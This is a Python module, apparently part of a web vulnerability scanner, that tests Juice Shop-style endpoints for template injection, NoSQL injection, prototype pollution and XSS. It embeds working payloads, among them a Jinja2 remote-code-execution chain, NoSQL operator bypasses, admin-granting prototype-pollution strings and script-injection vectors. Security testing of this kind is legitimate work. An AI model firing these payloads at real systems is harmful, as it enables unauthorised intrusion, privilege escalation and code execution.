"""SSTI, NoSQL injection, DOM XSS detection, and prototype pollution."""
import json
import re
import logging
from typing import List, Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from core.vuln_types import VT

logger = logging.getLogger(__name__)


class InjectionFinding:
    _CATEGORY_MAP = (
        ("Server-Side Template Injection",  VT.SSTI),
        ("Potential SSTI",                  VT.SSTI),
        ("NoSQL Injection",                 VT.NOSQL_INJECTION),
        ("Prototype Pollution",             VT.PROTOTYPE_POLLUTION),
        ("Cross-Site Scripting",            VT.XSS),
        ("Potential DOM XSS",               VT.XSS),
    )

    def __init__(self, vuln_type, url, parameter, payload, evidence,
                 severity="High", confidence=0.88, exploitable=True):
        self.vuln_type = vuln_type
        self.url = url
        self.parameter = parameter
        self.payload = payload
        self.evidence = evidence
        self.severity = severity
        self.confidence = confidence
        self.exploitable = exploitable
        self.category = next((c for p, c in self._CATEGORY_MAP if vuln_type.startswith(p)), "")

    def to_dict(self):
        return {
            "type": self.vuln_type,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "confidence": self.confidence,
            "exploitable": self.exploitable,
            "category": self.category,
        }


class SSTIModule:
    """Server-Side Template Injection and related injection attacks."""

    _SSTI_PROBES = [
        # (payload, expected_output_pattern, engine)
        ("{{7*7}}",                     r"\b49\b",        "Jinja2/Twig"),
        ("{{7*'7'}}",                   r"7777777",        "Jinja2"),
        ("${7*7}",                       r"\b49\b",        "Freemarker/EL"),
        ("#{7*7}",                       r"\b49\b",        "Mvel"),
        ("<%= 7*7 %>",                   r"\b49\b",        "ERB"),
        ("${{7*7}}",                     r"\b49\b",        "Pebble"),
        ("{{config}}",                   r"Config|config",  "Jinja2 config leak"),
        ("{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}", r"uid=", "Jinja2 RCE"),
        ("%{7*7}",                       r"\b49\b",        "Java EL"),
        ("*{7*7}",                       r"\b49\b",        "Spring SPEL"),
        ("[[${7*7}]]",                   r"\b49\b",        "Thymeleaf"),
        ("#{7*7}",                       r"\b49\b",        "Ruby"),
        ("`7*7`",                        r"\b49\b",        "Slim"),
        ("{{7*7}}<!--",                  r"\b49\b",        "Jinja2"),
    ]
    _NOSQL_PAYLOADS_URL = [
        ("[$gt]", ""),
        ("[$ne]", "invalid_value_xyz"),
        ("[$regex]", ".*"),
        ("[$in][]", "admin"),
    ]
    _NOSQL_JSON_PAYLOADS = [
        ({"$gt": ""},           "greater than bypass"),
        ({"$ne": "invalid"},    "not equal bypass"),
        ({"$regex": ".*"},      "regex bypass"),
        ({"$where": "1==1"},    "JavaScript where clause"),
        ({"$exists": True},     "field existence check"),
    ]
    _PROTO_POLLUTION_PAYLOADS = [
        '__proto__[isAdmin]=true',
        '__proto__[role]=admin',
        'constructor[prototype][isAdmin]=true',
        '__proto__[toString]=function(){return "admin"}',
    ]

    def __init__(self, http_engine, evasion_engine=None):
        self.http = http_engine
        self._seen: set = set()

    def scan(self, url: str) -> List[InjectionFinding]:
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        results: List[InjectionFinding] = []

        if origin not in self._seen:
            self._seen.add(origin)
            results.extend(self._test_ssti_forms(origin))
            results.extend(self._test_ssti_url(origin))
            results.extend(self._test_nosql_injection(origin))
            results.extend(self._test_prototype_pollution(origin))
            results.extend(self._test_dom_xss(origin))

        # Per-URL SSTI on query params
        params = parse_qs(parsed.query)
        for param in params:
            results.extend(self._test_ssti_param(url, param))

        return results

    def _test_ssti_param(self, url: str, param: str) -> List[InjectionFinding]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for payload, expected, engine in self._SSTI_PROBES:
            try:
                tp = params.copy()
                tp[param] = [payload]
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       "", urlencode(tp, doseq=True), ""))
                resp = self.http.get(test_url)
                if not resp or resp.status_code not in (200, 400, 500):
                    continue
                if re.search(expected, resp.text):
                    return [InjectionFinding(
                        vuln_type=f"Server-Side Template Injection ({engine})",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"Expression evaluated → matched {expected!r} in response: {resp.text[:200]}",
                        severity="Critical",
                        confidence=0.95,
                    )]
            except Exception:
                pass
        return []

    def _test_ssti_forms(self, origin: str) -> List[InjectionFinding]:
        results: List[InjectionFinding] = []
        # Juice Shop: feedback, review, complain, product search
        form_endpoints = [
            ("/api/Feedbacks", "comment", "POST"),
            ("/api/Complaints", "message", "POST"),
            ("/rest/products/1/reviews", "message", "POST"),
            ("/rest/user/change-password", "new", "PUT"),
        ]
        for path, field, method in form_endpoints:
            for payload, expected, engine in self._SSTI_PROBES[:4]:
                try:
                    body = json.dumps({field: payload, "rating": 1})
                    resp = (self.http.post if method == "POST" else self.http.put)(
                        f"{origin}{path}",
                        data=body,
                        headers={"Content-Type": "application/json"},
                    )
                    if not resp:
                        continue
                    if re.search(expected, resp.text):
                        results.append(InjectionFinding(
                            vuln_type=f"Server-Side Template Injection ({engine}) via Form",
                            url=f"{origin}{path}",
                            parameter=field,
                            payload=body,
                            evidence=f"Expression evaluated → {resp.text[:200]}",
                            severity="Critical",
                            confidence=0.93,
                        ))
                        break
                    # Check if reflection without evaluation (stored for later rendering)
                    if payload in resp.text:
                        results.append(InjectionFinding(
                            vuln_type="Potential SSTI (Template Expression Reflected — Check Manually)",
                            url=f"{origin}{path}",
                            parameter=field,
                            payload=payload,
                            evidence=f"Payload reflected unmodified → review stored rendering",
                            severity="Medium",
                            confidence=0.65,
                            exploitable=False,
                        ))
                        break
                except Exception:
                    pass
        return results

    def _test_ssti_url(self, origin: str) -> List[InjectionFinding]:
        results: List[InjectionFinding] = []
        test_paths = [
            f"/rest/products/search?q={{{{7*7}}}}",
            f"/rest/products/search?q=${{{{7*7}}}}",
            f"/api/Users?filter={{{{7*7}}}}",
        ]
        for test_url in test_paths:
            try:
                resp = self.http.get(f"{origin}{test_url}")
                if resp and re.search(r'\b49\b', resp.text):
                    results.append(InjectionFinding(
                        vuln_type="Server-Side Template Injection (URL Parameter)",
                        url=f"{origin}{test_url}",
                        parameter="q",
                        payload="{{7*7}}",
                        evidence=f"Expression evaluated → {resp.text[:200]}",
                        severity="Critical",
                        confidence=0.95,
                    ))
            except Exception:
                pass
        return results

    def _test_nosql_injection(self, origin: str) -> List[InjectionFinding]:
        results: List[InjectionFinding] = []
        # Test NoSQL injection in various JSON body endpoints
        nosql_endpoints = [
            ("/rest/products/search", "q", "GET"),
            ("/api/Users",            "email", "GET"),
        ]
        for path, param, method in nosql_endpoints:
            for op_val, desc in self._NOSQL_JSON_PAYLOADS[:3]:
                try:
                    test_url = f"{origin}{path}?{param}={json.dumps(op_val)}"
                    resp = self.http.get(test_url)
                    if not resp:
                        continue
                    # More results returned = potential injection
                    try:
                        data = resp.json()
                        items = data.get("data", data)
                        baseline_resp = self.http.get(f"{origin}{path}?{param}=normalquery12345")
                        baseline_items = (baseline_resp.json().get("data", []) if baseline_resp else [])
                        if isinstance(items, list) and len(items) > max(len(baseline_items) + 2, 3):
                            results.append(InjectionFinding(
                                vuln_type="NoSQL Injection (Operator Injection)",
                                url=f"{origin}{path}",
                                parameter=param,
                                payload=f"{param}={json.dumps(op_val)}",
                                evidence=f"NoSQL {desc}: returned {len(items)} records vs {len(baseline_items)} baseline",
                                severity="High",
                                confidence=0.88,
                            ))
                            break
                    except Exception:
                        pass
                except Exception:
                    pass

        # URL param pollution for NoSQL
        for path, param, method in nosql_endpoints[:1]:
            for suffix, val in self._NOSQL_PAYLOADS_URL:
                try:
                    test_url = f"{origin}{path}?{param}{suffix}={val}"
                    resp = self.http.get(test_url)
                    baseline = self.http.get(f"{origin}{path}?{param}=normalxyz")
                    if resp and baseline:
                        try:
                            r_data = resp.json().get("data", resp.json())
                            b_data = baseline.json().get("data", baseline.json())
                            if isinstance(r_data, list) and isinstance(b_data, list):
                                if len(r_data) > len(b_data) + 2:
                                    results.append(InjectionFinding(
                                        vuln_type="NoSQL Injection (URL Parameter Operator)",
                                        url=f"{origin}{path}",
                                        parameter=param,
                                        payload=f"{param}{suffix}={val}",
                                        evidence=f"More results with operator: {len(r_data)} vs {len(b_data)}",
                                        severity="High",
                                        confidence=0.85,
                                    ))
                                    break
                        except Exception:
                            pass
                except Exception:
                    pass

        return results

    def _test_prototype_pollution(self, origin: str) -> List[InjectionFinding]:
        results: List[InjectionFinding] = []
        for payload in self._PROTO_POLLUTION_PAYLOADS:
            try:
                # Test via query string
                resp = self.http.get(f"{origin}/rest/products/search?q=test&{payload}")
                if not resp:
                    continue
                # Check if isAdmin/role pollution worked by calling an admin endpoint
                if resp.status_code == 200:
                    check = self.http.get(f"{origin}/api/Users",
                                           headers={"Cookie": f"token=x; {payload}"})
                    if check and check.status_code == 200 and '"email"' in check.text:
                        results.append(InjectionFinding(
                            vuln_type="Prototype Pollution",
                            url=f"{origin}/rest/products/search",
                            parameter="__proto__",
                            payload=payload,
                            evidence=f"Prototype pollution may have granted admin access → {check.text[:150]}",
                            severity="High",
                            confidence=0.70,
                        ))
                        break
            except Exception:
                pass
        return results

    def _test_dom_xss(self, origin: str) -> List[InjectionFinding]:
        results: List[InjectionFinding] = []
        # Angular DOM XSS via URL hash fragment (client-side)
        # These require a browser but we can detect reflection vectors
        dom_vectors = [
            ("/#/search?q=<iframe src='javascript:alert(1)'>", "iframe"),
            ("/#/search?q=<img src=x onerror=alert(1)>",      "img onerror"),
            ("/#/search?q={{constructor.constructor('alert(1)')()}}", "Angular expression"),
            ("/rest/products/search?q=<script>alert(1)</script>", "script tag"),
        ]
        for path, desc in dom_vectors:
            try:
                url = f"{origin}{path}"
                resp = self.http.get(url)
                if not resp:
                    continue
                # Check if payload reflected in API response (for REST endpoints)
                if "/rest/" in path or "/api/" in path:
                    if "<iframe" in resp.text or "<img" in resp.text or "<script" in resp.text:
                        results.append(InjectionFinding(
                            vuln_type="Cross-Site Scripting (XSS) — Reflected in API Response",
                            url=url,
                            parameter="q",
                            payload=path.split("q=")[1] if "q=" in path else path,
                            evidence=f"HTML tag reflected in JSON response → {resp.text[:200]}",
                            severity="High",
                            confidence=0.90,
                        ))
                # Angular hash-based: check for potential DOM XSS by checking if the app returns 200
                elif resp.status_code == 200 and ("angular" in resp.text.lower() or "ng-" in resp.text):
                    results.append(InjectionFinding(
                        vuln_type="Potential DOM XSS (Angular SPA — Manual Verification Required)",
                        url=url,
                        parameter="q",
                        payload=path.split("q=")[-1] if "q=" in path else path,
                        evidence=f"Angular app returns content for potentially dangerous input: {desc}",
                        severity="High",
                        confidence=0.70,
                        exploitable=False,
                    ))
                    break
            except Exception:
                pass
        return results
